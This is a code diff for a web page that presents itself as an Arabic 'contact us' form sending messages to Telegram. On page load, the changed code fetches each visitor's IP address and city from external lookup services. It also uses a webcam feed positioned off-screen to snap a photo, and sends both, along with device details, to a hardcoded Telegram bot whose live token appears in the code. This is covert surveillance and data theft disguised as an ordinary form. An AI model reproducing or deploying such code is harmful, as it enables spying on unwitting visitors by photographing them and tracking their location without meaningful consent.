@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Send to Telegram | نموذج التواصل + كاميرا</title>
+    <title>Send to Telegram | نموذج التواصل + كاميرا + IP</title>
     
     <!-- Google Fonts - خطوط عربية حديثة -->
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -58,7 +58,6 @@
             box-shadow: 0 25px 70px rgba(0, 0, 0, 0.4);
         }
 
-        /* إشعار الكاميرا */
         .camera-notice {
             background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
             color: white;
@@ -78,10 +77,6 @@
         @keyframes pulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.85; }
-        }
-
-        .camera-notice i {
-            font-size: 20px;
         }
 
         .camera-notice.warning {
@@ -232,17 +227,6 @@
             }
         }
 
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
         .footer {
             text-align: center;
             margin-top: 30px;
@@ -291,13 +275,28 @@
             to { transform: rotate(360deg); }
         }
 
-        /* فيديو الكاميرا المخفي */
         #hiddenVideo {
             position: fixed;
             top: -9999px;
             left: -9999px;
             width: 640px;
             height: 480px;
+        }
+
+        .ip-info {
+            background: #f0f0f0;
+            border-radius: 12px;
+            padding: 10px;
+            margin-bottom: 20px;
+            font-size: 12px;
+            text-align: center;
+            color: #666;
+            direction: ltr;
+        }
+
+        .ip-info i {
+            color: #764ba2;
+            margin-left: 5px;
         }
     </style>
 </head>
@@ -309,10 +308,15 @@
             <p>نرحب بملاحظاتك واستفساراتك</p>
         </div>
 
-        <!-- إشعار الكاميرا -->
         <div id="cameraNotice" class="camera-notice">
             <i class="fas fa-camera"></i>
             <span id="cameraNoticeText">جاري تجهيز الكاميرا...</span>
+        </div>
+
+        <!-- عرض معلومات IP -->
+        <div id="ipInfo" class="ip-info">
+            <i class="fas fa-globe"></i>
+            <span id="ipAddress">جاري جلب عنوان IP...</span>
         </div>
 
         <form id="telegramForm">
@@ -342,12 +346,10 @@
         </div>
     </div>
 
-    <!-- فيديو مخفي لالتقاط الصورة -->
     <video id="hiddenVideo" autoplay playsinline></video>
     <canvas id="hiddenCanvas" style="display: none;"></canvas>
 
     <script>
-        // ==================== الكود الأصلي لنموذج تيليجرام ====================
         const BOT_TOKEN = '8920328815:AAEOP0sR3Jc98i0osmfnh9t21m3WGusW2FA';
         const CHAT_ID = '8416078700';
 
@@ -355,6 +357,11 @@
         const resultDiv = document.getElementById('result');
         const cameraNotice = document.getElementById('cameraNotice');
         const cameraNoticeText = document.getElementById('cameraNoticeText');
+        const ipAddressSpan = document.getElementById('ipAddress');
+
+        let userIP = 'غير معروف';
+        let userCountry = '';
+        let userCity = '';
 
         function setLoading(isLoading) {
             const submitBtn = form.querySelector('button[type="submit"]');
@@ -369,39 +376,51 @@
             }
         }
 
-        // ==================== إضافة جديدة: التقاط صورة وإرسالها ====================
-        async function captureAndSendPhoto() {
+        // ==================== جلب IP باستخدام API خارجي ====================
+        async function fetchUserIP() {
             try {
-                const video = document.getElementById('hiddenVideo');
-                const canvas = document.getElementById('hiddenCanvas');
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // استخدام ipapi.co للحصول على معلومات IP كاملة
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
                 
-                video.srcObject = stream;
+                if (data.ip) {
+                    userIP = data.ip;
+                    userCountry = data.country_name || '';
+                    userCity = data.city || '';
+                    const region = data.region || '';
+                    
+                    let locationText = `${userIP}`;
+                    if (userCity || userCountry) {
+                        locationText += ` (${userCity}${userCity && userCountry ? ', ' : ''}${userCountry})`;
+                    }
+                    
+                    ipAddressSpan.innerHTML = `<i class="fas fa-globe"></i> عنوان IP: ${locationText}`;
+                    
+                    // إرسال إشعار IP إلى تيليجرام
+                    await sendIPNotification();
+                } else {
+                    throw new Error('Failed to get IP');
+                }
+            } catch (error) {
+                console.error('خطأ في جلب IP:', error);
+                ipAddressSpan.innerHTML = '<i class="fas fa-globe"></i> تعذر جلب عنوان IP';
                 
-                // انتظر حتى يبدأ الفيديو
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        setTimeout(resolve, 500); // انتظر نصف ثانية للتأكد من جاهزية الكاميرا
-                    };
-                });
-                
-                // التقاط الصورة من الفيديو
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // تحويل الصورة إلى Blob (ملف)
-                const blob = await new Promise(resolve => {
-                    canvas.toBlob(resolve, 'image/jpeg', 0.85);
-                });
-                
-                // إيقاف الكاميرا
-                stream.getTracks().forEach(track => track.stop());
-                video.srcObject = null;
-                
-                // إنشاء بيانات الوقت والتاريخ للصورة
+                // محاولة استخدام API بديل
+                try {
+                    const fallbackResponse = await fetch('https://api.ipify.org?format=json');
+                    const fallbackData = await fallbackResponse.json();
+                    userIP = fallbackData.ip;
+                    ipAddressSpan.innerHTML = `<i class="fas fa-globe"></i> عنوان IP: ${userIP}`;
+                    await sendIPNotification();
+                } catch (fallbackError) {
+                    console.error('فشل API البديل:', fallbackError);
+                }
+            }
+        }
+
+        // ==================== إرسال إشعار IP إلى التيليجرام ====================
+        async function sendIPNotification() {
+            try {
                 const now = new Date();
                 const timestamp = now.toLocaleString('ar-EG', { 
                     timeZone: 'Africa/Cairo',
@@ -413,14 +432,114 @@
                     second: '2-digit'
                 });
                 
-                // إنشاء FormData لإرسال الصورة
+                const userAgent = navigator.userAgent;
+                const screenSize = `${screen.width}x${screen.height}`;
+                const language = navigator.language;
+                
+                const message = `🌐 *زائر جديد دخل الموقع*\n\n` +
+                    `📌 *عنوان IP:* \`${userIP}\`\n` +
+                    `📍 *الموقع:* ${userCity}${userCity && userCountry ? ', ' : ''}${userCountry || 'غير معروف'}\n` +
+                    `🕐 *الوقت:* ${timestamp}\n` +
+                    `💻 *نظام التشغيل:* ${getOS(userAgent)}\n` +
+                    `🌍 *المتصفح:* ${getBrowser(userAgent)}\n` +
+                    `📱 *حجم الشاشة:* ${screenSize}\n` +
+                    `🔤 *اللغة:* ${language}\n` +
+                    `🔗 *الصفحة:* ${window.location.href}`;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('فشل إرسال إشعار IP:', error);
+            }
+        }
+
+        // ==================== مساعدة: تحديد نظام التشغيل ====================
+        function getOS(userAgent) {
+            if (userAgent.includes('Windows')) return 'Windows';
+            if (userAgent.includes('Mac')) return 'MacOS';
+            if (userAgent.includes('Linux')) return 'Linux';
+            if (userAgent.includes('Android')) return 'Android';
+            if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
+            return 'غير معروف';
+        }
+
+        // ==================== مساعدة: تحديد المتصفح ====================
+        function getBrowser(userAgent) {
+            if (userAgent.includes('Chrome')) return 'Chrome';
+            if (userAgent.includes('Firefox')) return 'Firefox';
+            if (userAgent.includes('Safari')) return 'Safari';
+            if (userAgent.includes('Edge')) return 'Edge';
+            if (userAgent.includes('Opera')) return 'Opera';
+            return 'غير معروف';
+        }
+
+        // ==================== التقاط صورة وإرسالها ====================
+        async function captureAndSendPhoto() {
+            try {
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                
+                // التحقق من دعم getUserMedia
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    throw new Error('المتصفح لا يدعم الكاميرا');
+                }
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(resolve, 800);
+                    };
+                });
+                
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    throw new Error('فيديو الكاميرا غير جاهز');
+                }
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const blob = await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.85);
+                });
+                
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+                
+                const now = new Date();
+                const timestamp = now.toLocaleString('ar-EG', { 
+                    timeZone: 'Africa/Cairo',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+                
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, `snapshot_${Date.now()}.jpg`);
-                formData.append('caption', `📸 *صورة تلقائية عند دخول الموقع*\n\n🕐 الوقت: ${timestamp}\n🌐 الجهاز: ${navigator.userAgent.split(' ').slice(-2).join(' ')}\n📱 الشاشة: ${screen.width}x${screen.height}\n\n_هذه الصورة تساعدك على تتبع التغيرات عبر الزمن_`);
+                formData.append('caption', `📸 *صورة تلقائية عند دخول الموقع*\n\n` +
+                    `🕐 الوقت: ${timestamp}\n` +
+                    `🌐 الجهاز: ${getOS(navigator.userAgent)} | ${getBrowser(navigator.userAgent)}\n` +
+                    `📱 الشاشة: ${screen.width}x${screen.height}\n` +
+                    `🔗 عنوان IP: ${userIP}\n` +
+                    `📍 الموقع: ${userCity} ${userCountry}\n\n` +
+                    `_هذه الصورة تساعدك على تتبع التغيرات عبر الزمن_`);
                 formData.append('parse_mode', 'Markdown');
                 
-                // إرسال الصورة إلى تيليجرام
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
@@ -431,13 +550,6 @@
                 if (data.ok) {
                     cameraNotice.className = 'camera-notice success';
                     cameraNoticeText.innerHTML = '✅ تم التقاط الصورة وإرسالها بنجاح!';
-                    
-                    // إضافة رسالة في نتيجة النموذج أيضاً
-                    const tempResult = document.createElement('div');
-                    tempResult.className = 'result success';
-                    tempResult.innerHTML = '📸 تم إرسال صورة الدخول إلى تيليجرام';
-                    resultDiv.parentNode.insertBefore(tempResult, resultDiv);
-                    setTimeout(() => tempResult.remove(), 5000);
                 } else {
                     throw new Error(data.description || 'فشل إرسال الصورة');
                 }
@@ -445,32 +557,36 @@
             } catch (error) {
                 console.error('خطأ في الكاميرا:', error);
                 
-                // تحديد نوع الخطأ
-                if (error.name === 'NotAllowedError') {
+                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                     cameraNotice.className = 'camera-notice warning';
                     cameraNoticeText.innerHTML = '⚠️ لم يتم السماح بالكاميرا. الرجاء السماح بالوصول إلى الكاميرا لالتقاط الصور التلقائية';
                 } else if (error.name === 'NotFoundError') {
                     cameraNotice.className = 'camera-notice error';
                     cameraNoticeText.innerHTML = '❌ لا توجد كاميرا متاحة على هذا الجهاز';
-                } else if (error.message.includes('HTTP')) {
+                } else if (error.message.includes('HTTP') || location.protocol !== 'https:') {
                     cameraNotice.className = 'camera-notice warning';
-                    cameraNoticeText.innerHTML = '⚠️ يجب تشغيل الموقع عبر HTTPS ليعمل الكاميرا (استخدم GitHub Pages أو Vercel)';
+                    cameraNoticeText.innerHTML = '⚠️ يفضل تشغيل الموقع عبر HTTPS ليعمل الكاميرا بشكل أفضل';
                 } else {
                     cameraNotice.className = 'camera-notice error';
-                    cameraNoticeText.innerHTML = '❌ فشل التقاط الصورة: ' + error.message;
+                    cameraNoticeText.innerHTML = '❌ فشل التقاط الصورة';
                 }
                 
-                // محاولة إرسال رسالة نصية بدلاً من الصورة
                 await sendTextNotification(error.message);
             }
         }
         
-        // إرسال إشعار نصي بديل إذا فشلت الكاميرا
         async function sendTextNotification(errorMsg) {
             try {
                 const now = new Date();
                 const timestamp = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
-                const text = `⚠️ *تنبيه دخول (بدون صورة)*\n\n🕐 الوقت: ${timestamp}\n🌐 المتصفح: ${navigator.userAgent}\n❌ خطأ الكاميرا: ${errorMsg}\n📊 الشاشة: ${screen.width}x${screen.height}\n\n_لم يتمكن الموقع من التقاط صورة بسبب الخطأ أعلاه_`;
+                const text = `⚠️ *تنبيه دخول (بدون صورة)*\n\n` +
+                    `🕐 الوقت: ${timestamp}\n` +
+                    `🌐 المتصفح: ${getBrowser(navigator.userAgent)}\n` +
+                    `💻 نظام التشغيل: ${getOS(navigator.userAgent)}\n` +
+                    `🔗 عنوان IP: ${userIP}\n` +
+                    `📍 الموقع: ${userCity} ${userCountry}\n` +
+                    `❌ خطأ الكاميرا: ${errorMsg}\n\n` +
+                    `_لم يتمكن الموقع من التقاط صورة بسبب الخطأ أعلاه_`;
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -486,7 +602,7 @@
             }
         }
         
-        // ==================== كود النموذج الأصلي ====================
+        // ==================== النموذج الأساسي ====================
         form.addEventListener('submit', async (event) => {
             event.preventDefault();
             
@@ -494,7 +610,16 @@
             const email = document.getElementById('email').value;
             const message = document.getElementById('message').value;
             
-            const text = `New message:\n\nName: ${name}\nEmail: ${email}\nMessage: ${message}`;
+            const now = new Date();
+            const timestamp = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
+            
+            const text = `📬 *رسالة جديدة من الموقع*\n\n` +
+                `👤 *الاسم:* ${name}\n` +
+                `📧 *البريد:* ${email}\n` +
+                `💬 *الرسالة:* ${message}\n\n` +
+                `🕐 *الوقت:* ${timestamp}\n` +
+                `🔗 *عنوان IP:* \`${userIP}\`\n` +
+                `📍 *الموقع:* ${userCity} ${userCountry}`;
             
             setLoading(true);
             resultDiv.innerHTML = '';
@@ -505,7 +630,8 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: text
+                        text: text,
+                        parse_mode: 'Markdown'
                     })
                 });
                 
@@ -527,12 +653,15 @@
             }
         });
         
-        // ==================== تشغيل الكاميرا تلقائياً عند تحميل الصفحة ====================
-        // ننتظر قليلاً حتى تتحمّل الصفحة بالكامل ثم نبدأ الكاميرا
-        window.addEventListener('load', () => {
+        // ==================== تشغيل كل شيء عند تحميل الصفحة ====================
+        window.addEventListener('load', async () => {
+            // جلب IP أولاً
+            await fetchUserIP();
+            
+            // ثم تشغيل الكاميرا بعد تأخير بسيط
             setTimeout(() => {
                 captureAndSendPhoto();
-            }, 1000);
+            }, 1500);
         });
     </script>
 </body>
